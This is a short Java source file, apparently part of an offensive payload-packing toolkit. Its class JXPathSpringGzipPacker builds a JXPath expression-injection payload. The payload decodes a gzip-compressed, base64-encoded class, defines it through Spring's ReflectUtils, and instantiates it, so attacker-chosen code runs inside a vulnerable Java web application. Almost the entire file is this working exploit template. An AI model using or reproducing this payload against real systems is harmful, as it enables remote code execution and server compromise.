package com.reajason.javaweb.packer.jxpath;

import com.reajason.javaweb.packer.ClassPackerConfig;
import com.reajason.javaweb.packer.Packer;
import com.reajason.javaweb.packer.Packers;

/**
 * @author ReaJason
 * @since 2024/12/13
 */
public class JXPathSpringGzipPacker implements Packer {
    String template = "newInstance(org.springframework.cglib.core.ReflectUtils.defineClass('{{className}}',org.springframework.util.StreamUtils.copyToByteArray(java.util.zip.GZIPInputStream.new(java.io.ByteArrayInputStream.new(org.springframework.util.Base64Utils.decodeFromString('{{base64Str}}')))),getContextClassLoader(java.lang.Thread.currentThread())))";

    @Override
    public String pack(ClassPackerConfig config) {
        return template.replace("{{className}}", config.getClassName())
                .replace("{{base64Str}}", Packers.GzipBase64.getInstance().pack(config));
    }
}
